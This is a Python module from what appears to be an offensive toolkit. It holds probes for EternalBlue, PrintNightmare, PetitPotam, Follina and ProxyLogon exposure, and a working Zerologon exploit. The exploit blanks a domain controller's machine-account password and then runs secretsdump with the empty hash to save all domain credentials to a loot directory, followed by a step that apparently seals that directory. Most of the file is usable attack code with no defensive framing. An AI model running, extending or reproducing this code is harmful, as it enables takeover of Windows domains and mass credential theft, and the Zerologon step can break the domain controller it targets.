"""quantum.weapons.legacy — legacy-tier checks + Zerologon core."""
from __future__ import annotations

import os
import random
import socket
import subprocess
import sys

from quantum.core.deps import nrpc, transport, HAS_IMPACKET
from quantum.core.env import LOOT_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import log
from quantum.core.opsec import tcp_probe


def _wget(url, timeout=3, **kw):
    from quantum.core.deps import requests
    try:
        r = requests.get(url, timeout=timeout, verify=False, **kw)
        return {"status_code": r.status_code, "len": len(r.content or b""),
                "text": (r.text or "")[:120]}
    except Exception as exc:
        return {"error": str(exc)}


def check_ms17010(ip, params=None):
    """CVE-2017-0144 EternalBlue family — SMBv1 negotiate check."""
    params = params or {}
    try:
        s = socket.create_connection((ip, 445), timeout=2)
        pkt = (b"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18"
               b"\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
               b"\x00\x00\xfe\xff\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43"
               b"\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52"
               b"\x41\x4d\x20\x31\x2e\x30\x00\x02\x4d\x49\x43\x52\x4f"
               b"\x53\x4f\x46\x54\x20\x4e\x45\x54\x57\x4f\x52\x4b\x53"
               b"\x20\x31\x2e\x30\x33\x00\x02\x50\x43\x20\x4e\x45\x54"
               b"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20"
               b"\x31\x2e\x30\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32"
               b"\x00")
        s.sendall(pkt)
        resp = s.recv(256)
        s.close()
        vuln_hint = params.get("ms17_010")
        return {"cve": "CVE-2017-0144", "status": "check",
                "smb": "open", "negprot": len(resp),
                "ms17_010": vuln_hint if vuln_hint is not None else "unknown"}
    except OSError as exc:
        return {"cve": "CVE-2017-0144", "status": "no-service", "error": str(exc)}


def check_printnightmare(ip, params=None):
    """CVE-2021-1675 PrintNightmare — spooler exposure check."""
    open_ports = [p for p in (445, 135) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2021-1675", "status": "check",
            "spooler_rpc": "exposed" if open_ports else "closed"}


def check_petitpotam(ip, params=None):
    """CVE-2021-36942 PetitPotam — NTLM relay exposure check."""
    open_ports = [p for p in (445, 135, 3389) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2021-36942", "status": "check",
            "efsrpc": "exposed" if open_ports else "closed"}


def check_follina(ip, params=None):
    """CVE-2022-30190 Follina MSDT — URI-handler exposure check."""
    r = _wget(f"http://{ip}/msdt", timeout=2)
    return {"cve": "CVE-2022-30190", "status": "check", "detail": r}


def check_proxylogon(ip, params=None):
    """CVE-2021-26855 ProxyLogon — Exchange autodiscover probe."""
    r = _wget(f"https://{ip}/autodiscover/autodiscover.xml", timeout=3)
    return {"cve": "CVE-2021-26855", "status": "probe", "detail": r}


# ============================================================================
# Zerologon core (CVE-2020-1472)
# ============================================================================

def check_zerologon(dc_ip, dc_name):
    try:
        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
        try:
            nrpc.hNetrServerReqChallenge(dce, "\\\\" + dc_name + "\x00",
                                         "QCLI%08x\x00" % random.getrandbits(32),
                                         nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
        except Exception: return False
        dce.disconnect(); return True
    except Exception as ex:
        log(f"probe_zerologon {dc_ip}: {ex}", "WARN"); return None


def exploit_zerologon(dc_ip, dc_name, domain=""):
    dce = None
    try:
        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
        computer = "\\\\" + dc_name + "\x00"; account = dc_name + "$\x00"
        resp = nrpc.hNetrServerReqChallenge(dce, computer, "QCLI%08x\x00" % random.getrandbits(32),
                                           nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
        session = nrpc.ComputeSessionKey("", resp["ServerChallenge"], b"\x00" * 8, b"\x00" * 8)
        nrpc.hNetrServerAuthenticate3(dce, computer, account,
                                     nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                     "QCLI%08x\x00" % random.getrandbits(32), session, 0x0000FFFF)
        log(f"Zerologon: secure channel established vs {dc_ip}", "ATK")
        nrpc.hNetrServerPasswordSet2(dce, computer, account,
                                    nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                    "QCLI%08x\x00" % random.getrandbits(32), session,
                                    nrpc.NRPC_AUTHENTICATOR().copy(populate=False))
        log(f"Zerologon: machine account password blanked on {dc_name}", "OK")
        return True
    except Exception as e:
        log(f"Zerologon failed vs {dc_ip}: {e} (likely patched)", "WARN"); return False
    finally:
        try:
            if dce: dce.disconnect()
        except Exception: pass


def zerologon_dump(dc_ip, dc_name, domain):
    if not exploit_zerologon(dc_ip, dc_name, domain): return None
    out = os.path.join(LOOT_DIR, f"domain_dump_{dc_name}")
    cmd = [sys.executable, "-m", "impacket.examples.secretsdump", f"{domain}/{dc_name}$@{dc_ip}",
           "-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0", "-outputfile", out]
    try:
        subprocess.check_call(cmd); log(f"Domain dump complete -> {out}", "OK")
        GRAYFISH.seal_dir(); return out
    except Exception as e:
        log(f"secretsdump failed: {e}", "ERR"); return None
